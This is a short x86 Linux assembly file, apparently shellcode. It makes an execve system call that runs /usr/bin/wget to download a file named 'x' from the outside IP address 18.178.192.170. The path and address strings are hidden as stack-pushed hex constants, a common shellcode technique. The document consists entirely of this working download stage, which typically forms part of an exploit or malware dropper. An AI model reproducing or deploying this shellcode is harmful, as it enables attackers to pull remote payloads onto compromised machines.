global _start

section .text

_start:
    ;download 18.178.192.170//x with wget
    push 0xb
    pop eax
    cdq
    push edx
    
    push 0x782f3037 ;x/07 
    push 0x312e3239 ;1.29  
    push 0x312e3837 ;1.87  
    push 0x312e3831 ;1.81  
    mov ecx,esp
    push edx
    
    push 0x74 ;t
    push 0x6567772f ;egw/
    push 0x6e69622f ;nib/
    push 0x7273752f ;rsu/
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80